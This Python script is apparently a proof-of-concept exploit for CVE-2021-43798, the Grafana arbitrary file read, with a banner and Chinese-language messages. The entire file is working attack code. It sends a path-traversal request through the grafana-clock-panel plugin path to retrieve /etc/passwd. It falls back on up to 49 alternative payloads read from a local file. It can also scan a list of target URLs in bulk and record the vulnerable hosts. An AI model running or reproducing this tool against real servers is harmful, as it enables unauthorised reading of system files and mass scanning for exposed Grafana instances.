# -*- coding -*-
import requests
import colorama
import argparse
from urllib.parse import urlparse
from tqdm import tqdm


with open('poc.txt', 'r') as p:
    pocs = p.readlines()


def title():
    print(colorama.Fore.YELLOW + """
   ____  __     __  _____           ____     ___    ____    _           _  _     _____   _____    ___     ___  
  / ___| \ \   / / | ____|         |___ \   / _ \  |___ \  / |         | || |   |___ /  |___  |  / _ \   ( _ ) 
 | |      \ \ / /  |  _|    _____    __) | | | | |   __) | | |  _____  | || |_    |_ \     / /  | (_) |  / _ \ 
 | |___    \ V /   | |___  |_____|  / __/  | |_| |  / __/  | | |_____| |__   _|  ___) |   / /    \__, | | (_) |
  \____|    \_/    |_____|         |_____|  \___/  |_____| |_|            |_|   |____/   /_/       /_/   \___/                                                       
    """)
    print(colorama.Fore.YELLOW + '\t\t\t\t\tCVE-2021-43798 Grafana任意文件读取\r\n' + '\t\t\t\t\t\t\t\t' + colorama.Fore.LIGHTBLUE_EX + 'By:K3rwin' + colorama.Fore.RESET)  


def Poc(url):
    url_vul = url + '/public/plugins/grafana-clock-panel/../../../../../../../../etc/passwd'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
    'Referer': 'https://www.baidu.com'
    }
    try:
        req = requests.get(url_vul, headers=headers, verify=False)
        code = req.status_code
        text = req.text
        if code == 200 and ("root:x" in text):
            print('[+]任意文件读取漏洞存在,/etc/passwd内容如下：[+]')
            print(text)
        else:
            print("默认poc验证失败，尝试poc.txt内所有poc，稍等，进度条如下：")
            for poc in tqdm(pocs):
                url_vul = url + poc
                req = requests.get(url_vul, headers=headers, verify=False)
                code = req.status_code
                text = req.text
                if code == 200 and ("root:x" in text):
                    print('[+]任意文件读取漏洞存在,/etc/passwd内容如下：[+]')
                    print(text)
                    exit()
            print('[-]漏洞不存在[-]')
    except KeyboardInterrupt:
        print('被crtl + c 中断程序')
    except:
        print('[-]url无法访问或者出现未知错误[-]')


def Pocs(url, count):
    url_vul = url + '/public/plugins/grafana-clock-panel/../../../../../../../../etc/passwd'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
    'Referer': 'https://www.baidu.com'
    }
    
    try:
        req = requests.get(url_vul, headers=headers, verify=False)
        code = req.status_code
        text = req.text
        url_vuls = open('result.txt', 'w+')
        if code == 200 and ("root:x" in text):
            url_vuls.write(url_vul)
            count = count + 1
        url_vuls.close()
    except KeyboardInterrupt:
        print('被crtl + c 中断程序')
    except:
        print('[-]url无法访问或者出现未知错误[-]')
    return count
    


def get_args():
    parser = argparse.ArgumentParser(description="命令行传入url参数，-u 指定单个地址，-r 从文件读取批量地址")
    parser.add_argument('-u', type=str, help='单个url地址，可尝试49个poc')
    parser.add_argument('-r', type=str, help='url文件列表，只使用默认poc')
    args = parser.parse_args()
    url = args.u
    file = args.r
    if url:
        url = urlparse(url)
        url = url.scheme + '://' + url.netloc
        Poc(url)
    elif file:
        with open(file) as f:
            print("正在验证所有url地址，进度如下：")
            count = 0
            urllist = f.readlines()
            for url_ in tqdm(urllist):
                url_p = urlparse(url_)
                url = url_p.scheme + '://' + url_p.netloc
                count = Pocs(url, count)
            print('[+]{}个地址存在漏洞,已存放在result.txt文件中[+]'.format(count))
    else:
        print('please set -u or -r,use python3 grafana.py -h')
                

if __name__ == '__main__':
    title()
    get_args()
